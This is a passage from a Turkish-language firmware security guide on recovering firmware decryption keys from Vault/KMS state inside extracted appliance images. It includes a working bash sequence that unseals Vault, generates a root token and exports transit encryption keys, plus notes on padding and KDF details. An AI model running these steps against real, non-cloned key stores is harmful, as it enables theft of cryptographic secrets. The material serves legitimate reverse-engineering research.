- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault state içinden firmware decryption keys kurtarma

Bir update image, küçük plaintext metadata ile büyük bir high-entropy blob'u birlikte içeriyorsa herhangi bir brute-force işleminden önce container triage yapın:<sup>[[1]](#references)</sup>

- `hexdump`, `xxd`, `strings -tx`, `base64 -d` ve `binwalk -E` ile headers, offsets ve line boundaries bilgilerini dump edin.
- `Salted__` genellikle OpenSSL `enc` formatını ifade eder: sonraki 8 byte salt'tır ve kalan byte'lar ciphertext'tir.
- Tam olarak `256` byte'a decode olan bir Base64 field, RSA-2048 ciphertext ile rastgele bir firmware password/session key'in wrap edildiğine dair güçlü bir işarettir.
- Aynı file içindeki detached PGP material genellikle yalnızca authenticity'yi korur; confidentiality mechanism olduğunu varsaymayın.

Static key hunting (`grep`, `strings`, PEM/PGP searches) başarısız olursa yalnızca private keys aramak yerine **operational decrypt path**'i reverse edin:

- Updater / management binary'sini decompile edin ve encrypted blob'u kimin okuduğunu, hangi helper/API'nin bunu unwrap ettiğini ve istediği logical key name'i takip edin.
- Extract edilmiş root filesystem içinde KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) ile unit files ve init scripts arayın.
- Plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens veya local KMS auto-unseal scripts değerlerini private-key material ile eşdeğer kabul edin.

Appliance original Vault binary'sini ve storage backend'ini içeriyorsa, Vault internals'ı yeniden implement etmek yerine bu environment'ı replay etmek genellikle daha kolaydır:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Cloned KMS üzerinde root erişimiyle:

- Transit keys'i yalnızca izole clone içinde export edilebilir hâle getirin: `vault write transit/keys/<name>/config exportable=true`
- Unwrap key'i export edin: `vault read transit/export/encryption-key/<name>`
- Kurtarılan RSA key'ini, KMS tarafından kullanılan tam padding/hash çiftiyle deneyin. Başarısız bir PKCS#1 v1.5 decrypt ve başarısız bir varsayılan OAEP decrypt işlemi, key'in yanlış olduğunu **kanıtlamaz**; birçok Vault-backed akış SHA-256 ile OAEP kullanırken yaygın library'ler varsayılan olarak SHA-1 kullanır.
- Payload `Salted__` ile başlıyorsa, AES-CBC decrypt işlemini denemeden önce vendor'ın OpenSSL KDF'sini (`EVP_BytesToKey`, legacy appliance'larda genellikle MD5) tam olarak yeniden üretin.

Bu, "encrypted firmware" sorununu daha genel bir probleme dönüştürür: **appliance tarafındaki operational key'leri kurtarın, ardından tam unwrap + KDF parametrelerini offline olarak yeniden üretin**.

## Eğitim ve Sertifika

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## Referanslar

- [1] [Claude ile Firmware Cracking: Senior-Level Skill, Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Terk edilmiş donanımlarda zero-day'leri Exploit Etmek – Trail of Bits blogu](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20 Dolarlık Bir Smart Device Bana Evinize Erişim Nasıl Sağladı](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Şimdi Görüyorsunuz: Artık Pwned'siniz](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector'ı şarj portu connector'ı üzerinden Exploit Etmek - Part 2: anti-downgrade'i bypass etmek](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: Philips Hue Bridge'in Over-the-Air Exploitation'ı](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
